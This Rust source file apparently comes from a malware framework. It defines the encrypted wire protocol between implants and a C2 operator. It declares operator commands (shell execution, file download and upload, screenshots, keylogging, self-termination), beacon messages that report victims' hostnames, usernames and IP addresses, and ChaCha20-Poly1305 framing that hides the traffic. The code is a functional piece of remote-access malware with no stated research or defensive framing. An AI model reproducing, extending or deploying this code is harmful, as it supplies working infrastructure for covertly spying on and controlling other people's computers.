use std::fmt;

use chacha20poly1305::{
    aead::{Aead, KeyInit, OsRng},
    AeadCore, ChaCha20Poly1305, Nonce,
};
use serde::{Deserialize, Serialize};

/// Payload types carried by beacon messages from implant to operator.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PayloadType {
    Checkin,
    CommandResult,
    FileUpload,
    Screenshot,
    KeylogData,
    ShellOutput,
}

impl fmt::Display for PayloadType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Checkin => "Checkin",
            Self::CommandResult => "CommandResult",
            Self::FileUpload => "FileUpload",
            Self::Screenshot => "Screenshot",
            Self::KeylogData => "KeylogData",
            Self::ShellOutput => "ShellOutput",
        };
        write!(f, "{label}")
    }
}

/// Command types the operator can issue to an implant.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CommandType {
    Shell,
    Download,
    Upload,
    Screenshot,
    Keylog,
    Sleep,
    Die,
    Config,
}

impl fmt::Display for CommandType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Shell => "Shell",
            Self::Download => "Download",
            Self::Upload => "Upload",
            Self::Screenshot => "Screenshot",
            Self::Keylog => "Keylog",
            Self::Sleep => "Sleep",
            Self::Die => "Die",
            Self::Config => "Config",
        };
        write!(f, "{label}")
    }
}

/// Execution status reported by an implant after running a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CommandStatus {
    Success,
    Failed,
    Timeout,
    Running,
}

/// Message sent from implant to C2 operator.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconMessage {
    pub implant_id: String,
    pub timestamp: u64,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip: String,
    pub payload_type: PayloadType,
    pub data: Vec<u8>,
}

/// Command sent from operator to implant.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandMessage {
    pub command_id: String,
    pub implant_id: String,
    pub command_type: CommandType,
    pub args: Vec<String>,
    pub timeout_secs: u64,
}

/// Response sent from implant after command execution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResponseMessage {
    pub command_id: String,
    pub status: CommandStatus,
    pub output: Vec<u8>,
    pub error: Option<String>,
}

/// Wrapper enum for all C2 wire messages.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum C2Message {
    Beacon(BeaconMessage),
    Command(CommandMessage),
    Response(ResponseMessage),
}

/// Per-session encryption context using ChaCha20-Poly1305.
pub struct SessionCipher {
    cipher: ChaCha20Poly1305,
}

/// Errors from C2 protocol operations.
#[derive(Debug)]
pub enum C2ProtocolError {
    SerializationFailed(String),
    DeserializationFailed(String),
    EncryptionFailed,
    DecryptionFailed,
    FrameTooShort,
    InvalidFrameLength,
}

impl fmt::Display for C2ProtocolError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::SerializationFailed(msg) => write!(f, "serialization failed: {msg}"),
            Self::DeserializationFailed(msg) => write!(f, "deserialization failed: {msg}"),
            Self::EncryptionFailed => write!(f, "encryption failed"),
            Self::DecryptionFailed => write!(f, "decryption failed"),
            Self::FrameTooShort => write!(f, "frame too short"),
            Self::InvalidFrameLength => write!(f, "invalid frame length"),
        }
    }
}

impl std::error::Error for C2ProtocolError {}

/// Nonce size for ChaCha20-Poly1305 (12 bytes).
const NONCE_SIZE: usize = 12;

/// Length prefix size (4 bytes, big-endian u32).
const LENGTH_PREFIX_SIZE: usize = 4;

impl SessionCipher {
    /// Create a new session cipher from a 32-byte key.
    pub fn new(key: &[u8; 32]) -> Self {
        let cipher = ChaCha20Poly1305::new(key.into());
        Self { cipher }
    }

    /// Generate a random 32-byte session key.
    pub fn generate_key() -> [u8; 32] {
        use chacha20poly1305::aead::rand_core::RngCore;
        let mut key = [0u8; 32];
        OsRng.fill_bytes(&mut key);
        key
    }

    /// Encrypt plaintext, returning nonce || ciphertext.
    pub fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, C2ProtocolError> {
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
        let ciphertext = self
            .cipher
            .encrypt(&nonce, plaintext)
            .map_err(|_| C2ProtocolError::EncryptionFailed)?;
        let mut output = Vec::with_capacity(NONCE_SIZE + ciphertext.len());
        output.extend_from_slice(nonce.as_slice());
        output.extend_from_slice(&ciphertext);
        Ok(output)
    }

    /// Decrypt data produced by `encrypt` (nonce || ciphertext).
    pub fn decrypt(&self, encrypted: &[u8]) -> Result<Vec<u8>, C2ProtocolError> {
        if encrypted.len() < NONCE_SIZE {
            return Err(C2ProtocolError::FrameTooShort);
        }
        let nonce = Nonce::from_slice(&encrypted[..NONCE_SIZE]);
        let ciphertext = &encrypted[NONCE_SIZE..];
        self.cipher
            .decrypt(nonce, ciphertext)
            .map_err(|_| C2ProtocolError::DecryptionFailed)
    }
}

/// Serialize a C2Message to CBOR bytes.
pub fn serialize_message(msg: &C2Message) -> Result<Vec<u8>, C2ProtocolError> {
    let mut buf = Vec::new();
    ciborium::into_writer(msg, &mut buf)
        .map_err(|e| C2ProtocolError::SerializationFailed(e.to_string()))?;
    Ok(buf)
}

/// Deserialize a C2Message from CBOR bytes.
pub fn deserialize_message(data: &[u8]) -> Result<C2Message, C2ProtocolError> {
    ciborium::from_reader(data)
        .map_err(|e| C2ProtocolError::DeserializationFailed(e.to_string()))
}

/// Encode a C2Message into an encrypted, length-prefixed wire frame.
///
/// Wire format: `[4-byte big-endian length][nonce (12 bytes)][ciphertext]`
///
/// The length field covers everything after itself (nonce + ciphertext).
pub fn encode_frame(
    msg: &C2Message,
    cipher: &SessionCipher,
) -> Result<Vec<u8>, C2ProtocolError> {
    let cbor = serialize_message(msg)?;
    let encrypted = cipher.encrypt(&cbor)?;
    let len = encrypted.len() as u32;
    let mut frame = Vec::with_capacity(LENGTH_PREFIX_SIZE + encrypted.len());
    frame.extend_from_slice(&len.to_be_bytes());
    frame.extend_from_slice(&encrypted);
    Ok(frame)
}

/// Decode a length-prefixed encrypted wire frame back to a C2Message.
///
/// Returns the decoded message and number of bytes consumed from the input.
pub fn decode_frame(
    data: &[u8],
    cipher: &SessionCipher,
) -> Result<(C2Message, usize), C2ProtocolError> {
    if data.len() < LENGTH_PREFIX_SIZE {
        return Err(C2ProtocolError::FrameTooShort);
    }
    let len = u32::from_be_bytes([data[0], data[1], data[2], data[3]]) as usize;
    let total = LENGTH_PREFIX_SIZE + len;
    if data.len() < total {
        return Err(C2ProtocolError::FrameTooShort);
    }
    let encrypted = &data[LENGTH_PREFIX_SIZE..total];
    let cbor = cipher.decrypt(encrypted)?;
    let msg = deserialize_message(&cbor)?;
    Ok((msg, total))
}

#[cfg(test)]
#[path = "c2_protocol_test.rs"]
mod tests;
